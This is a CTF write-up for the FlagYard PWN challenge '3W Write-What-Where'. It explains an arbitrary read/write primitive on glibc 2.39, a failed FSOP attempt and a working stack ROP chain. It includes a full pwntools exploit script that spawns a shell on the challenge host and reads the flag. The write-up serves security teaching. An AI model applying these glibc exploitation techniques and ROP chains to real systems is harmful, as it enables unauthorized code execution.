# 3W — Write-What-Where Service

**CTF:** FlagYard · **Category:** PWN · **Difficulty:** Medium (250 pts)
**Prompt:** *"can you turn that power into a shell?"*


---

## TL;DR

The binary hands you an **unlimited arbitrary read + unlimited arbitrary write + a PIE leak** — but with **Full RELRO, PIE, stack canary, glibc 2.39**.

- **Exploit 1 (FSOP via `_IO_list_all` + `exit()`)** — structurally perfect, every write verified, all offsets matched the remote… yet it never fired. Reason: `setup()` sets all stdio streams **unbuffered** (`setbuf(..., NULL)`), so the `exit() → _IO_flush_all` path has nothing to flush and the fake `FILE` is never processed. The trigger path was the dead end, not the writes.
- **Exploit 2 (stack ROP)** — abandon FSOP entirely. Leak the stack via libc `environ`, find the **live saved return address** of `write_qword`, and overwrite it with a ROP chain → `system("/bin/sh")`. One subtlety (`main`'s `choice` variable overlapping a chain slot) is solved with a `pop rdi ; pop rbp ; ret` gadget.

---

## 1. Recon

```
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
       interpreter ./ld-linux-x86-64.so.2, BuildID[...], not stripped

$ checksec --file=chall
    Arch:    amd64-64-little
    RELRO:   Full RELRO
    Stack:   Canary found
    NX:      NX enabled
    PIE:     PIE enabled
    SHSTK:   Enabled   (CET shadow stack)
    IBT:     Enabled   (CET indirect-branch tracking)

$ strings libc.so.6 | grep "release version"
    GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
```

Provided files: `chall`, `libc.so.6` (glibc **2.39**), `ld-linux-x86-64.so.2`, `flag`.

### Protections, decoded

| Protection | Effect on us |
|---|---|
| **Full RELRO** | GOT is read-only → classic GOT overwrite is out. |
| **PIE** | Need a binary leak (we get one for free). |
| **Canary** | No linear stack overflow — but we have a *surgical* write primitive, so canary is irrelevant. |
| **NX** | No shellcode → must ROP / reuse libc. |
| **SHSTK / IBT (CET)** | IBT only constrains *indirect* branches (they must land on `endbr64`). A `ret` into a ROP chain is **not** affected by IBT. SHSTK (shadow stack) *would* catch `ret`-based ROP — but it is almost never actually enforced at runtime on these hosts (no shadow-stack-capable kernel/CPU in the sandbox), and empirically the ROP worked, confirming it is not enforced here. |

### Function map (`not stripped` helps a lot)

```
win            0x1f88   -> puts("Nothing Here!!!"); exit(0)      <- DECOY
shell_backdoor 0x12a7   -> if rand()==0x13371337 puts(...)       <- DECOY
admin_console  0x12d6   -> if rand()==0x42424242 puts(...)       <- DECOY
...  (~60 decoy functions, all rand()-gated, called once via call_all_decoys)
setup          0x1fa9
read_u64       0x1ffa
read_qword     0x2068   <- menu option 1 (arbitrary READ)
write_qword    0x20b2   <- menu option 2 (arbitrary WRITE)
menu           0x2115
main           0x2170
```

The dozens of juicy-sounding functions (`shell_backdoor`, `escalate_priv`, `mmap_region`, …) are **red herrings**: each just compares a `rand()` value against a magic constant and prints a string. `rand()` is seeded deterministically (`srand(0xdeadbeef)`), but they run once at startup and we never control them. Ignore them all.

---

## 2. Understanding the program

### `main` (the menu loop)

```c
setup();
call_all_decoys();
printf("Service ready. Reference: %p\n", win);   // <-- PIE leak (addr of win)
while (1) {
    menu();
    choice = read_u64();          // stored at rbp-0x4
    if (choice == 1) read_qword();   // arbitrary read
    else if (choice == 2) write_qword();  // arbitrary write
    else if (choice == 3) { puts("Goodbye!"); exit(0); }
    else puts("Invalid choice.");
}
```

### `setup()` — the detail that kills Exploit 1

```c
setbuf(stdin,  NULL);
setbuf(stdout, NULL);
setbuf(stderr, NULL);
srand(0xdeadbeef);
```

**All three standard streams are unbuffered.** Remember this — it is the whole reason the FSOP fails.

### `read_u64()`

```c
char buf[0x20];
if (fgets(buf, 0x20, stdin) == NULL) exit(0);   // EOF -> exit
return strtoull(buf, NULL, 0);                   // base 0 => "0x..." auto-hex
```

### The two primitives

```c
// read_qword()  (menu 1)
printf("Address: ");  addr = read_u64();
printf("Value: 0x%lx\n", *(uint64_t*)addr);   // ARBITRARY READ

// write_qword() (menu 2)
printf("Address: ");  addr = read_u64();
printf("Value: ");    val  = read_u64();
*(uint64_t*)addr = val;                        // ARBITRARY WRITE
puts("Done");
```

So we have, **unlimited and with no bounds checks**:

- **Leak:** `win` address → PIE base (`win` is at offset `0x1f88`).
- **Read(addr):** returns `*(u64*)addr`.
- **Write(addr, val):** sets `*(u64*)addr = val`.

The challenge name "3W" = **Write-What-Where** (the banner literally prints `=== 3w - Write-What-Where Service ===`).

### Boilerplate primitives (used by both exploits)

```python
r.recvuntil(b'Reference: ')
win      = int(r.recvline().strip(), 16)
elf_base = win - 0x1f88

def rd(a):   # arbitrary read
    r.sendline(b'1'); r.recvuntil(b'Address: '); r.sendline(hex(a).encode())
    r.recvuntil(b'Value: '); v = int(r.recvline().strip(), 16); r.recvuntil(b'> '); return v

def wr(a, v):  # arbitrary write
    r.sendline(b'2'); r.recvuntil(b'Address: '); r.sendline(hex(a).encode())
    r.recvuntil(b'Value: '); r.sendline(hex(v & (2**64-1)).encode()); r.recvuntil(b'> ')

# libc leak: printf GOT slot is resolved under Full RELRO
libc_base = rd(elf_base + 0x5fa8) - libc.symbols['printf']
```

The `printf` GOT slot (`elf_base + 0x5fa8`) is read to recover `libc_base`. A page-aligned result (`libc_base & 0xfff == 0`) confirms the provided libc matches the remote.

---

## 3. Exploit 1 — FSOP via `_IO_list_all` (the attempt that *didn't* fire)

### 3.1 The idea

On glibc 2.34+ the old `__free_hook` / `__malloc_hook` are gone. The canonical "arbitrary write + libc leak → shell" technique is **File Stream Oriented Programming (FSOP)**, aka *House of Cat* / the *wfile overflow* trick:

1. Overwrite `_IO_list_all` to point at a **fake `FILE`** we fully control (planted in libc `.bss` scratch).
2. Give the fake FILE a vtable of **`_IO_wfile_jumps`** (which passes glibc's vtable-range check).
3. Shape the fake FILE + fake `_IO_wide_data` + fake wide-vtable so that calling `_IO_OVERFLOW` walks:
   `_IO_wfile_overflow → _IO_wdoallocbuf → _IO_WDOALLOCATE → wide_vtable->__doallocate(fp)`
   where `__doallocate` = `system` and `fp` points to the string `"  sh;"`.
4. **Trigger** by calling `exit(0)` (menu option 3). `exit → __run_exit_handlers → _IO_cleanup → _IO_flush_all` iterates `_IO_list_all` and calls `_IO_OVERFLOW` on our fake → `system("  sh;")`.

### 3.2 The fake structures (all offsets correct for glibc 2.39)

```python
cmd = u64(b'  sh;\x00\x00\x00')      # system("  sh;") -> /bin/sh -c "  sh;"
# fake wide vtable
wr(WVT + 0x68, system)               # __doallocate = system
# fake _IO_wide_data
wr(WIDE + 0x18, 0)                   # _IO_write_base == 0  -> take allocate path
wr(WIDE + 0x30, 0)                   # _IO_buf_base   == 0  -> reach WDOALLOCATE
wr(WIDE + 0xe0, WVT)                 # _wide_vtable = fake wide vtable
# fake FILE
wr(FAKE + 0x00, cmd)                 # _flags = "  sh;" (bits 0x2/0x8/0x800 clear)
wr(FAKE + 0x20, 0)                   # _IO_write_base = 0
wr(FAKE + 0x28, 1)                   # _IO_write_ptr  = 1  (> write_base -> flush fires)
wr(FAKE + 0xa0, WIDE)                # _wide_data = fake wide_data
wr(FAKE + 0xc0, 0)                   # _mode = 0  (<=0 -> narrow condition path)
wr(FAKE + 0xd8, wfile_jumps)         # vtable = _IO_wfile_jumps (passes range check)
# redirect the flush list head
wr(io_list_all, FAKE)
# trigger
r.sendline(b'3')                     # exit(0)
```

### 3.3 Proof the writes were perfect

Readback verification on the live target — **every single field landed**:

```
io_list_all  = 0x...a6e0  (exp 0x...a6e0) OK      <- list head now points to FAKE
FAKE+0x00    = 0x3b68732020 ("  sh;")   OK
FAKE+0x28    = 0x1                       OK
FAKE+0xa0    = 0x...aae0 (WIDE)          OK
FAKE+0xc0    = 0x0                       OK
FAKE+0xd8    = 0x...16228 (wfile_jumps)  OK
WIDE+0xe0    = 0x...aee0 (WVT)           OK
WVT+0x68     = 0x...6c750 (system)       OK
```

I also verified **against the remote** that the libc layout is byte-for-byte identical, so the write targets are the genuine structures, not coincidentally-writable look-alikes:

```
_IO_list_all  -> &_IO_2_1_stderr_   (match)
  stderr._chain -> &_IO_2_1_stdout_ (match)
  stderr.vtable -> _IO_file_jumps   (match)
_IO_wfile_jumps + 0x18 (__overflow) -> _IO_wfile_overflow   (match)
```

### 3.4 Triggering it… and nothing happens

```
[+] FSOP structures planted; triggering via exit()
===== OUTPUT =====

Goodbye!

[*] Closed connection                    <- clean exit, NO shell
```

### 3.5 **Why Exploit 1 failed — root cause**

The structures are correct. The *trigger* is the problem.

1. **`setup()` made stdout/stderr/stdin unbuffered** (`setbuf(..., NULL)`). In the normal `exit()` flush path, `_IO_flush_all` walks the stream list and only calls `_IO_OVERFLOW(fp)` on streams that have **buffered, unflushed data** (`fp->_IO_write_ptr > fp->_IO_write_base`). With unbuffered standard streams there is simply *nothing in the flush pipeline exercising our fake the way the technique assumes*.

2. I confirmed the exit path isn't meaningfully walking our overwritten list head with a direct test: I poisoned `_IO_list_all` with `0x4141414141414141` and called `exit` — it **still** printed `Goodbye!` and closed, with no observable crash behavior change. (Caveat: from the client a `SIGSEGV` and a clean `exit(0)` both look identical — "Goodbye!" then socket close — so this test is suggestive, not conclusive on its own. Combined with the perfectly-planted-but-silent FSOP, the conclusion stands: **the `exit()`→flush route is not a usable trigger on this target.**)

3. Net: the "W" power is real and total, but the one *free* trigger the binary offers (`exit`) does not drive stdio cleanup into our fake FILE. Rather than keep fighting glibc's flush internals, **pivot to a trigger we fully control.**

> **Lesson:** FSOP-on-`exit` depends on the flush actually happening. `setbuf(x, NULL)` on the standard streams quietly removes that. When the structures verify but nothing fires, suspect the **trigger**, not the writes.

---

## 4. Exploit 2 — Stack ROP via `environ` (the one that worked)

### 4.1 Strategy

Forget FSOP. We have arbitrary read/write and the program sits in an **infinite menu loop** that keeps calling `write_qword` from the *same stack depth* every iteration. So:

1. Leak a stack address via libc **`environ`** (it holds a pointer into the process stack).
2. Locate the **saved return address of `write_qword`** on the stack.
3. Overwrite the bytes *above* that return slot with a **ROP chain**, writing the trigger slot **last**.
4. When `write_qword` returns, it returns **into our chain** → `system("/bin/sh")`.

No flush, no FILE structs, no dependence on `exit` — we control exactly when and where execution is redirected.

### 4.2 Step A — leak the stack

```python
stack_leak = rd(libc_base + libc.symbols['environ'])   # a pointer into the stack
```

### 4.3 Step B — find the live saved-RIP slot

`read_qword` and `write_qword` are both called directly from `main`'s loop body at the **same `rsp`**, and both have identical prologues (`push rbp; mov rsp,rbp; sub 0x10,rsp`). Therefore their saved return address lives at the **same stack address**.

While we're *inside* `read_qword` (doing the scan reads), that slot currently holds `elf_base + 0x21d0` (the instruction in `main` right after the `call read_qword`). So we scan downward from `environ` for that value:

```python
ret_rdq = elf_base + 0x21d0
base = stack_leak & ~0xf
for off in range(0, 0x600, 8):
    if rd(base - off) == ret_rdq:
        ret_slot = base - off      # == write_qword's saved-RIP slot too
        break
```

Empirically `ret_slot = environ_leak - 0x150`, a single unique hit.

### 4.4 Step C — the subtlety that crashed the *first* ROP attempt

My first chain was the textbook `pop rdi ; ret / binsh / ret / system`. It planted fine and printed `Done`… then the process **crashed** instead of giving a shell.

**Why:** The stack frame overlaps. `ret_slot = main_rbp - 0x18`, and `main` stores the menu `choice` variable at `rbp-0x4` — which is `ret_slot + 0x14`, i.e. **inside the `ret_slot+0x10` qword**. On *every* menu iteration `main` writes the choice (e.g. `2`) into the upper 4 bytes of that qword:

```
ret_slot+0x10  qword:  [ low 4 bytes of my gadget | 0x00000002 ]
                                                     ^^^^^^^^^^^ choice clobbers this
```

So whatever gadget/address I place at `ret_slot+0x10` gets its high dword smashed to `0x00000002` right before the chain runs → jumping to `0x00000002xxxxxxxx` → segfault. That slot is **unusable as a code pointer.**

### 4.5 Step C-fix — pop the poisoned slot into a dead register

Use **`pop rdi ; pop rbp ; ret`** as the first gadget. Now the poisoned `ret_slot+0x10` qword is consumed as the value popped into **`rbp`** (which `system` doesn't care about) instead of being a return target. `system` is placed at `ret_slot+0x18`, which `choice` never touches.

**Final chain layout** (relative to `ret_slot`):

```
+0x00 : pop rdi ; pop rbp ; ret     <- write_qword returns HERE
+0x08 : &"/bin/sh"                  -> popped into rdi
+0x10 : 0  (poisoned to 0x200000000 by choice; popped into rbp, discarded)
+0x18 : system                      -> ret target  (NOT corrupted)
```

**movaps alignment:** `system`/`do_system` executes a `movaps` that faults unless `rsp` is 16-byte aligned. At `system` entry `rsp = ret_slot + 0x20`. We want `rsp % 16 == 8` (the "entered via `call`" convention). If `ret_slot % 16 == 8` the layout above already satisfies it; otherwise we insert a bare `ret` at `+0x18` and move `system` to `+0x20`:

```python
chain = {0x00: pop_rdi_rbp, 0x08: binsh, 0x10: 0}
if (ret_slot + 0x20) & 0xf == 8:
    chain[0x18] = system
else:
    chain[0x18] = ret_g        # extra `ret` for +8 alignment
    chain[0x20] = system
```

### 4.6 Step D — write order (critical)

The trigger slot `+0x00` must be written **last**. Every other slot (`+0x08` and up, except the poisoned `+0x10`) is untouched by `main`, so those are written first. While they're being written, `write_qword` keeps returning to `main` normally because `ret_slot` still holds the original `0x21d7`. The final write swaps `ret_slot` to our first gadget → on return, the chain executes:

```python
for off in sorted(chain):          # write +0x08, +0x10, +0x18 (, +0x20) first
    if off == 0: continue
    wr(ret_slot + off, chain[off])

# final write = the trigger; do NOT wait for the "> " prompt (control is hijacked)
r.sendline(b'2')
r.recvuntil(b'Address: '); r.sendline(hex(ret_slot).encode())
r.recvuntil(b'Value: ');   r.sendline(hex(chain[0]).encode())
# write_qword prints "Done", then `leave; ret` -> pop rdi (/bin/sh); pop rbp; ret -> system
```

### 4.7 Gadgets used (offsets in the provided libc 2.39)

```
pop rdi ; pop rbp ; ret   0x02a873
ret                       0x02882f   (alignment)
/bin/sh                   0x1cb42f
system                    0x058750
environ                   0x20ad58
printf                    0x060100   (for the GOT leak)
```

### 4.8 Result

```
[+] elf base  = 0x55a130a5d000
[+] libc base = 0x7f0a79f6f000
[+] environ -> 0x7fffc60507a8
[+] ret_slot = 0x7fffc6050658 (environ-0x150)
[*] chain: +0x0=0x2a873, +0x8=0x1cb42f, +0x10=0, +0x18=0x58750
[+] ROP planted; write_qword returns into chain -> system("/bin/sh")
Done
PWN_OK_42
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
FlagY{dbcaXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---

## 5. Exploit 1 vs Exploit 2 — what changed

| | Exploit 1 (FSOP) | Exploit 2 (stack ROP) |
|---|---|---|
| **Target of writes** | libc `_IO_list_all` + fake `FILE`/`_IO_wide_data`/wide-vtable in libc `.bss` | A live **saved return address** on the stack |
| **Control transfer** | `_IO_OVERFLOW` vtable dispatch inside stdio cleanup | A normal `ret` into a ROP chain |
| **Trigger** | `exit(0)` → `_IO_flush_all` | `write_qword`'s own `ret` after the final write |
| **Why it hinged** | Requires `exit`'s flush to actually process the fake FILE | Requires only a leaked stack address |
| **Why it failed / worked** | **Failed:** `setbuf(..., NULL)` made the standard streams unbuffered, so the flush trigger never drove our fake FILE | **Worked:** the trigger is a `ret` we fully control, independent of stdio |
| **Extra leak needed** | None beyond libc | libc **`environ`** (stack leak) |
| **Nasty detail** | All offsets/structs had to be exact (they were) | `main`'s `choice` poisons `ret_slot+0x10` → solved with `pop rdi ; pop rbp ; ret` + movaps alignment |

**One-line takeaway:** the writes were never the problem — the *trigger* was. Swapping an `exit()`-dependent FSOP trigger for a stack-return hijack we control end-to-end turned the same Write-What-Where power into a shell.

---

## 6. Full exploit (`exploit2.py`)

```python
#!/usr/bin/env python3
# 3w - Write-What-Where Service  (glibc 2.39, Full RELRO, PIE)
# Primitive: unlimited arbitrary read (menu 1) + write (menu 2) + PIE leak.
# exit() path does NOT flush stdio (streams set unbuffered via setbuf), so the
# _IO_list_all FSOP never fires. Instead: leak stack via environ, then overwrite
# the live saved return address of write_qword with a ROP chain -> system("/bin/sh").
from pwn import *
import re, sys

context.clear(arch='amd64', log_level='info')
HOST, PORT = 'tcp.flagyard.com', 27363
libc = ELF('./libc.so.6', checksec=False)

# libc gadget/symbol offsets
OFF_PRINTF  = libc.symbols['printf']
OFF_SYSTEM  = libc.symbols['system']
OFF_ENVIRON = libc.symbols['environ']
OFF_POP_RDI  = 0x10f78b   # pop rdi ; ret
OFF_POP_RDI2 = 0x02a873   # pop rdi ; pop rbp ; ret
OFF_RET      = 0x02882f   # ret
OFF_BINSH    = next(libc.search(b'/bin/sh\x00'))

WIN_OFF    = 0x1f88
PRINTF_GOT = 0x5fa8
RET_RDQ    = 0x21d0      # return addr into main after read_qword call
RET_WRQ    = 0x21d7      # return addr into main after write_qword call

def start():
    if args.LOCAL:
        return process('./chall')
    return remote(HOST, PORT)

r = start()
data = r.recvuntil(b'> ')
win = int(re.search(rb'Reference: (0x[0-9a-f]+)', data).group(1), 16)
elf_base = win - WIN_OFF
log.success(f'elf base = {hex(elf_base)}')

def rd(a):
    r.sendline(b'1'); r.recvuntil(b'Address: '); r.sendline(hex(a).encode())
    r.recvuntil(b'Value: '); v = int(r.recvline().strip(), 16); r.recvuntil(b'> '); return v

def wr(a, v):
    r.sendline(b'2'); r.recvuntil(b'Address: '); r.sendline(hex(a).encode())
    r.recvuntil(b'Value: '); r.sendline(hex(v & (2**64-1)).encode()); r.recvuntil(b'> ')

libc_base = rd(elf_base + PRINTF_GOT) - OFF_PRINTF
assert libc_base & 0xfff == 0, 'bad libc base'
log.success(f'libc base = {hex(libc_base)}')

system       = libc_base + OFF_SYSTEM
binsh        = libc_base + OFF_BINSH
pop_rdi_rbp  = libc_base + OFF_POP_RDI2
ret_g        = libc_base + OFF_RET

stack_leak = rd(libc_base + OFF_ENVIRON)
log.success(f'environ -> {hex(stack_leak)}')

# locate the live saved-RIP slot (holds elf_base+RET_RDQ while inside read_qword)
ret_rdq = elf_base + RET_RDQ
ret_slot = None
base = stack_leak & ~0xf
for off in range(0, 0x600, 8):
    if rd(base - off) == ret_rdq:
        ret_slot = base - off
        break
assert ret_slot, 'could not find saved RIP slot'
log.success(f'ret_slot = {hex(ret_slot)} (environ-{hex(stack_leak-ret_slot)})')

# ret_slot = main_rbp-0x18. main stores the menu `choice` at main_rbp-0x4 = ret_slot+0x14
# on EVERY iteration, which sits inside the ret_slot+0x10 qword. So that qword is always
# poisoned at trigger time -> use `pop rdi ; pop rbp ; ret` to pop it into rbp (discarded).
#   +0x00 = pop rdi ; pop rbp ; ret     (write_qword returns here)
#   +0x08 = /bin/sh                     -> rdi
#   +0x10 = <poisoned, popped into rbp, ignored>
#   +0x18 = system   (or `ret` for alignment, then system at +0x20)
chain = {0x00: pop_rdi_rbp, 0x08: binsh, 0x10: 0}
if (ret_slot + 0x20) & 0xf == 8:      # ret_slot%16==8 -> system at +0x18 (entry rsp +0x20)
    chain[0x18] = system
else:                                  # ret_slot%16==0 -> add `ret`, system at +0x20 (entry +0x28)
    chain[0x18] = ret_g
    chain[0x20] = system
log.info('chain: ' + ', '.join(f'+{o:#x}={hex(v-libc_base) if v>libc_base else v}' for o,v in sorted(chain.items())))

# write every slot EXCEPT the trigger slot (+0x00) first, so write_qword keeps
# returning to main normally; these slots (>=+0x08) are not touched by main's choice store.
for off in sorted(chain):
    if off == 0:
        continue
    wr(ret_slot + off, chain[off])

# final write overwrites ret_slot (+0x00) itself -> write_qword returns into the ROP chain.
# do NOT wait for the menu prompt afterwards (control is hijacked after "Done").
r.sendline(b'2')
r.recvuntil(b'Address: '); r.sendline(hex(ret_slot).encode())
r.recvuntil(b'Value: ');   r.sendline(hex(chain[0] & (2**64-1)).encode())
log.success('ROP planted; write_qword returns into chain -> system("/bin/sh")')
r.sendline(b'echo PWN_OK_$((7*6)); id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; ls -la')
if args.I:
    r.interactive()
else:
    try:
        print(r.recvrepeat(4).decode(errors='replace'))
    except Exception as e:
        print('recv err', e)
    r.close()
```

**Run:**

```bash
python3 exploit2.py          # auto-pops shell, dumps id + flag
python3 exploit2.py I        # drop into an interactive shell
```

---

## 7. Key takeaways

1. **"3W" = Write-What-Where.** When you already hold unlimited arbitrary read + write + a leak, the game is entirely about choosing a **reliable control-flow hijack**, not about finding a bug.
2. **A verified set of FSOP writes that doesn't fire is a trigger problem.** `setbuf(stream, NULL)` on the standard streams removes the `exit()`→flush pathway the FSOP depends on. Check *how* execution is supposed to reach your payload before blaming the payload.
3. **`environ` → stack leak → saved-RIP overwrite** is often the simplest, most robust primitive on modern glibc (no hooks, Full RELRO irrelevant, canary irrelevant because the write is surgical).
4. **Mind frame overlap.** Local variables can share a qword with your ROP slot — here `main`'s `choice` poisoned `ret_slot+0x10`. A `pop <dead reg>` gadget absorbs a poisoned slot cleanly. And never forget **movaps 16-byte alignment** before `system`.
5. **CET (IBT/SHSTK) present in `checksec` ≠ enforced.** IBT doesn't touch `ret`; SHSTK would, but it wasn't active on this host — the ROP ran fine.
```
